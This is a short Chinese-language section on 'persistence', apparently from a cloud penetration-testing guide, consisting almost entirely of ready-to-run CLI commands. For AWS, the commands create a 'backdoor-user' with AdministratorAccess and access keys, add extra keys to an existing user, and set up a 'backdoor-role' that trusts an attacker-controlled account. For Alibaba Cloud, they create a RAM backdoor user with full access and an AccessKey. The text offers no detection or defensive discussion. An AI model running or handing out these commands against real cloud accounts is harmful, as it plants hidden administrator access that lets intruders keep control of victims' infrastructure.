# 持久化

### 7.1 AWS 持久化技术

#### 7.1.1 IAM 持久化

**方法 1：创建新的 IAM 用户**
```bash
# 创建管理员用户
aws iam create-user --user-name backdoor-user

# 附加管理员策略
aws iam attach-user-policy \
    --user-name backdoor-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 创建访问密钥
aws iam create-access-key --user-name backdoor-user
```

**方法 2：为现有用户添加访问密钥**
```bash
# 为现有用户创建额外的密钥对
aws iam create-access-key --user-name existing-user
```

**方法 3：创建高权限角色**
```bash
# 创建信任攻击者账户的角色
aws iam create-role \
    --role-name backdoor-role \
    --assume-role-policy-document '{
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::attacker-account-id:root"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    }'

# 附加管理员权限
aws iam attach-role-policy \
    --role-name backdoor-role \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 7.2 阿里云持久化

#### 7.2.1 RAM 持久化

```bash
# 创建 RAM 用户
aliyun ram CreateUser --UserName backdoor-user

# 附加管理员策略
aliyun ram AttachPolicyToUser \
    --UserName backdoor-user \
    --PolicyName AliyunFullAccess \
    --PolicyType System

# 创建 AccessKey
aliyun ram CreateAccessKey --UserName backdoor-user
```
